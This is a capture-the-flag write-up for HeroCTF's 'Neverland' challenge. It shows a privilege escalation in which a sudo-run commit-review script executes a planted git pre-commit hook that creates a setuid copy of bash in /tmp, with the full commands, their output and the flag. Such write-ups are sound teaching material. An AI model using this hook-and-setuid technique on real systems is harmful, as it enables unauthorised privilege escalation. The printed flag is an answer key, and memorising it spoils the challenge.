# Neverland

### Category

Misc

### Difficulty

Easy

### Author

Log_s

### Description

Peter Pan and Captain Hook are once again fighting in Neverland, instead of working and pushing PRs into production. Since this is a regular occurence, we have created a script that allows the intern to review PRs in their stead. Please don't touch Peter's fairy powder stock in /home/peter/flag.txt (i'm still convinced it's cocaine though, why else would they run around with swords in the office pretending they are flying ??)

Credentials: `intern:fairy`

DEPLOY: [https://deploy.heroctf.fr](https://deploy.heroctf.fr)

### Write Up

This challenge does not present any rabbitholes. Indeed, the vulerable part is the `commit.sh` script that our intern user is able to run as peter.
```
intern@neverland:~$ sudo -l
[sudo] password for intern: 
Matching Defaults entries for intern on neverland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User intern may run the following commands on neverland:
    (peter) /opt/commit.sh
```

The scripts makes multiple checks, but the main feature is that it commits a user supplied git repository. The two main requirements are:
- The repo must have the same last commit as the `/app/.git` repo. As commit hashes can not be forged, we have to take this repo as our base.
- The `.git/config` file must remain unchanged. This is probably because the developper is aware that it would be possible for a user to RCE by editing this file. We will have to use something else.

Since the rest of the repo is editable, we can add a hook script to `.git/hooks`. Git offers sereval types of hooks
```
intern@neverland:/app$ ls -l .git/hooks
total 60
-rwxrwxr-x 1 peter peter  478 Jul 16 12:42 applypatch-msg.sample
-rwxrwxr-x 1 peter peter  896 Jul 16 12:42 commit-msg.sample
-rwxrwxr-x 1 peter peter 4726 Jul 16 12:42 fsmonitor-watchman.sample
-rwxrwxr-x 1 peter peter  189 Jul 16 12:42 post-update.sample
-rwxrwxr-x 1 peter peter  424 Jul 16 12:42 pre-applypatch.sample
-rwxrwxr-x 1 peter peter 1643 Jul 16 12:42 pre-commit.sample
-rwxrwxr-x 1 peter peter  416 Jul 16 12:42 pre-merge-commit.sample
-rwxrwxr-x 1 peter peter 1374 Jul 16 12:42 pre-push.sample
-rwxrwxr-x 1 peter peter 4898 Jul 16 12:42 pre-rebase.sample
-rwxrwxr-x 1 peter peter  544 Jul 16 12:42 pre-receive.sample
-rwxrwxr-x 1 peter peter 1492 Jul 16 12:42 prepare-commit-msg.sample
-rwxrwxr-x 1 peter peter 2783 Jul 16 12:42 push-to-checkout.sample
-rwxrwxr-x 1 peter peter 3650 Jul 16 12:42 update.sample
```

By creating a pre-commit hook with the following content, the intern user is able execute commands as peter and access his personnal fairy powder stock.
```
intern@neverland:~$ cp -r /app ./app
intern@neverland:~$ echo -e '#!/bin/bash\ncp /bin/bash /tmp\nchmod +s /tmp/bash' > ./app/.git/hooks/pre-commit && chmod +x ./app/.git/hooks/pre-commit
intern@neverland:~$ tar -czf repo.tar.gz ./app
intern@neverland:~$ sudo -u peter /opt/commit.sh repo.tar.gz
[ADMIN GIT COMMIT] Received submission: repo.tar.gz
[ADMIN GIT COMMIT] Extracting archive to temporary directory: /tmp/git-review-37
[ADMIN GIT COMMIT] Changed directory to /tmp/git-review-37/app
[ADMIN GIT COMMIT] Verifying that your repository is up-to-date...
[ADMIN GIT COMMIT] Admin's latest commit: 585339ae859ef6e1527efc96139b1204e1d92cef
[ADMIN GIT COMMIT] Your latest commit:    585339ae859ef6e1527efc96139b1204e1d92cef
[ADMIN GIT COMMIT] SUCCESS: Commit history matches.
[ADMIN GIT COMMIT] Verifying integrity of .git/config file...
[ADMIN GIT COMMIT] Admin's .git/config hash: cfe7ba1238c9a78be7535d7c63bcaf5a4d5011d46b07c9b45d3bbf7d6c312dfe
[ADMIN GIT COMMIT] Your .git/config hash:    cfe7ba1238c9a78be7535d7c63bcaf5a4d5011d46b07c9b45d3bbf7d6c312dfe
[ADMIN GIT COMMIT] SUCCESS: .git/config is valid. Proceeding with review.
[ADMIN GIT COMMIT] Reviewing your proposed changes...
--------------------------------------------------
On branch master
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	modified:   .gitignore
	modified:   README.md
	modified:   config-tool.py

no changes added to commit (use "git add" and/or "git commit -a")
--------------------------------------------------
[ADMIN GIT COMMIT] Everything looks good. Adding your changes to the staging area.
[ADMIN GIT COMMIT] Committing your changes to the official branch. Stand by...
[ADMIN GIT COMMIT] Changes successfully committed.
[ADMIN GIT COMMIT] Cleaning up temporary files...
[ADMIN GIT COMMIT] Process complete. Thank you for your contribution.
intern@neverland:~$ /tmp/bash -p
bash-5.2$ id
uid=1000(intern) gid=1000(intern) euid=1001(peter) egid=1001(peter) groups=1001(peter),100(users),1000(intern)
bash-5.2$ cat /home/peter/flag.txt
Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}
```

### Flag

Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}